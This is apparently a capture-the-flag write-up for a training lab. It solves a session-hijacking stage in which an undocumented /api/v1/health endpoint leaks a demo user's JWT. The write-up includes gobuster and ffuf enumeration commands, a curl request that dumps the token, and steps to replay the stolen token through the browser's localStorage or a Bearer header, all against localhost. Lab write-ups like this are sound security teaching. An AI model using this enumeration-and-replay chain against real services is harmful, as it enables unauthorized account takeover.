# Stage 1 Solve Writeup: Session Hijacking via Undocumented Debug Endpoint

## Description
Stage 1 simulates a realistic session hijacking vulnerability (CWE-613 Insufficient Session Expiration & CWE-200 Information Exposure). An undocumented legacy API route `/api/v1/health` leaks active authentication tokens of logged-in sessions (specifically, the pre-authenticated `demo` account). An attacker can harvest this token and use it to access the application as the compromised user. When the token is used for the first time by an unauthorized client, a telemetry trigger reports the misuse to the PWNDORA CTF coordinator.

## Discovery Commands

Using **gobuster**:
```bash
gobuster dir -u http://localhost:8000/ -w /usr/share/wordlists/dirb/common.txt
# Or targeting the api path structure specifically:
gobuster dir -u http://localhost:8000/api -w /usr/share/wordlists/dirb/common.txt
```

Using **ffuf** targeting API endpoints (e.g., using SecLists):
```bash
ffuf -u http://localhost:8000/FUZZ -w /usr/share/wordlists/secLists/Discovery/Web-Content/api/api-endpoints.txt
# Or focusing on v1 prefixes:
ffuf -u http://localhost:8000/api/FUZZ/health -w /usr/share/wordlists/secLists/Discovery/Web-Content/common.txt
```

## Solution Flow
1. Run directory enumeration against the host root or the `/api` root.
2. Find `/api/v1/health` responding with a `200 OK` status code.
3. Access `http://localhost:8000/api/v1/health` via `curl` or browser to dump the active leaked demo JWT token:
   ```bash
   curl http://localhost:8000/api/v1/health
   ```
4. Extract the leaked JWT token from the response body structure:
   ```json
   {
     "status": "ok",
     "service": "inbanaturals-api",
     "version": "1.0.4-legacy",
     "debug_active_sessions": [
       {
         "username": "demo",
         "token": "eyJhbGciOi..."
       }
     ],
     "debug_mode": true
   }
   ```
5. Trigger progress reporting and account takeover via either the Browser UI (recommended) or direct API replay:

   **Method A — Browser DevTools (Recommended)**:
   - Open `http://localhost:5174` in browser.
   - Open DevTools Console and execute:
     ```js
     localStorage.setItem('token', '<stolen_jwt>');
     ```
   - Refresh the page (`F5`). You are immediately logged in as **Demo User**, and PWNDORA platform Dashboard (`http://localhost:5173`) automatically updates to completed Stage 1, awards 100 points, and unlocks Stage 2!

   **Method B — Terminal / API Replay**:
   ```bash
   curl -H "Authorization: Bearer <stolen_jwt>" "http://localhost:8000/api/auth/me"
   ```
   This triggers the backend's compromise-detection logic, which reports the hijack event (`{"session_id": "<session>", "stage": 1, "proof": "session_hijack_confirmed", "artifact_type": "jwt", "victim_user": "demo", "timestamp": <timestamp>}`) to the coordinator via a signed HMAC-SHA256 webhook to unlock Stage 2.

